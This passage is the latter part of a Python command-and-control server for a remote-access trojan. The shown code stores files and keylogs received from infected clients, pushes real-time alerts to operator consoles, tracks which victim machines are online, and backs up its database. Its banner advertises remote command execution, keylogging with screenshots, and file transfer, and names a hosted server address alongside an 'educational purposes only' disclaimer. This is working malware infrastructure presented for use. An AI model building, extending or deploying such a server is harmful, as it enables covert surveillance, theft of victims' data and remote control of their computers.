                     VALUES (?, ?, ?, ?, ?, ?, ?, 1)''',
                 (file_id, client_id, filename, path, len(file_bytes), 
                  file_hash, datetime.now()))
        conn.commit()
        
        # Get user ID for notification
        c.execute("SELECT user_id FROM clients WHERE id = ?", (client_id,))
        result = c.fetchone()
        conn.close()
        
        if result:
            user_id = result[0]
            
            # Send notification to console
            emit('file_received', {
                'client_id': client_id,
                'filename': filename,
                'path': path,
                'size': len(file_bytes),
                'file_id': file_id,
                'timestamp': time.time()
            }, room=f"user_{user_id}")
    
    except Exception as e:
        logger.error(f"File transfer error: {e}")

@socketio.on('console_connect')
def handle_console_connect(data):
    """Console connects to listen for events"""
    user_id = data.get('user_id')
    client_id = data.get('client_id')
    
    if user_id:
        join_room(f"user_{user_id}")
        
        if client_id:
            join_room(f"client_{client_id}")
        
        logger.info(f"Console connected for user {user_id}")

# Utility functions
def get_uptime():
    """Get server uptime"""
    if not hasattr(get_uptime, 'start_time'):
        get_uptime.start_time = time.time()
    return time.time() - get_uptime.start_time

def get_time_ago(timestamp_str):
    """Convert timestamp to human readable time ago"""
    try:
        timestamp = datetime.fromisoformat(timestamp_str.replace('Z', '+00:00'))
        now = datetime.now(timestamp.tzinfo) if timestamp.tzinfo else datetime.now()
        delta = now - timestamp
        
        if delta.days > 0:
            return f"{delta.days}d ago"
        elif delta.seconds > 3600:
            return f"{delta.seconds // 3600}h ago"
        elif delta.seconds > 60:
            return f"{delta.seconds // 60}m ago"
        else:
            return f"{delta.seconds}s ago"
    except:
        return "Unknown"

def parse_cron(cron_expr):
    """Parse cron expression (simplified)"""
    # Simplified implementation
    return time.time() + 3600  # Default: 1 hour from now

def cleanup_old_data():
    """Cleanup old data based on retention policy"""
    conn = sqlite3.connect(app.config['DATABASE'])
    c = conn.cursor()
    
    # Calculate cutoff date
    cutoff = datetime.now() - timedelta(days=app.config['LOG_RETENTION_DAYS'])
    
    # Delete old commands
    c.execute("DELETE FROM commands WHERE timestamp < ?", (cutoff,))
    
    # Delete old keylogs (keep last 1000 per client)
    c.execute('''DELETE FROM keylogs WHERE id NOT IN 
                 (SELECT id FROM keylogs ORDER BY timestamp DESC LIMIT 1000)''')
    
    # Delete old alerts
    c.execute("DELETE FROM alerts WHERE timestamp < ? AND acknowledged = 1", (cutoff,))
    
    conn.commit()
    conn.close()
    logger.info("Cleaned up old data")

def backup_database():
    """Create database backup"""
    backup_file = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.db"
    backup_path = os.path.join('backups', backup_file)
    
    os.makedirs('backups', exist_ok=True)
    
    # Copy database
    import shutil
    shutil.copy2(app.config['DATABASE'], backup_path)
    
    # Compress backup
    with zipfile.ZipFile(f"{backup_path}.zip", 'w', zipfile.ZIP_DEFLATED) as zipf:
        zipf.write(backup_path, backup_file)
    
    os.remove(backup_path)
    logger.info(f"Database backed up to {backup_path}.zip")

# Background tasks
def start_background_tasks():
    """Start all background tasks"""
    scheduler = TaskScheduler()
    
    # Cleanup old data every 6 hours
    scheduler.add_task(cleanup_old_data, 6 * 3600)
    
    # Backup database daily
    scheduler.add_task(backup_database, 24 * 3600)
    
    # Check for stale clients every minute
    scheduler.add_task(check_stale_clients, 60)
    
    # Start scheduler in background
    threading.Thread(target=scheduler.run, daemon=True).start()

def check_stale_clients():
    """Check for stale clients and mark as offline"""
    with client_lock:
        current_time = time.time()
        stale_clients = []
        
        for client_id, client in list(clients.items()):
            if current_time - client.get('last_seen', 0) > 300:  # 5 minutes
                stale_clients.append(client_id)
        
        for client_id in stale_clients:
            clients[client_id]['online'] = False
            
            # Update database
            conn = sqlite3.connect(app.config['DATABASE'])
            c = conn.cursor()
            c.execute("UPDATE clients SET online = 0 WHERE id = ?", (client_id,))
            conn.commit()
            conn.close()
            
            logger.info(f"Marked client as offline: {client_id}")

def print_banner():
    """Print server banner"""
    banner = """
    ╔══════════════════════════════════════════════════════════════════════╗
    ║                     ULTIMATE C2 SERVER v2.0                          ║
    ║               Multi-Platform • Scalable • Enterprise                 ║
    ║                                                                      ║
    ║  Features:                                                           ║
    ║    • Real-time command execution     • Keylogging with screenshots   ║
    ║    • File transfer (up/down)         • Scheduled tasks               ║
    ║    • Multi-user with roles           • Advanced client management    ║
    ║    • Database persistence            • WebSocket real-time updates   ║
    ║    • Rate limiting                   • Automated backups             ║
    ║                                                                      ║
    ║  Server: https://c2-server-zz0i.onrender.com                         ║
    ║  Educational Purposes Only • Use Responsibly                         ║
    ╚══════════════════════════════════════════════════════════════════════╝
    """
    print(banner)
    print(f"[*] Server starting on port {os.environ.get('PORT', 10000)}")
    print("[*] Database initialized")
    print("[*] Background tasks started")
    print("[*] Press Ctrl+C to stop\n")

if __name__ == '__main__':
    print_banner()
    
    # Start background tasks
    start_background_tasks()
    
    # Run server
    port = int(os.environ.get('PORT', 10000))
    
    from gevent import pywsgi
    from geventwebsocket.handler import WebSocketHandler
    
    logger.info(f"Starting Ultimate C2 Server on 0.0.0.0:{port}")
    
    server = pywsgi.WSGIServer(
        ('0.0.0.0', port),
        app,
        handler_class=WebSocketHandler
    )
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        logger.info("Server shutting down gracefully...")
        server.stop()
        logger.info("Server stopped")
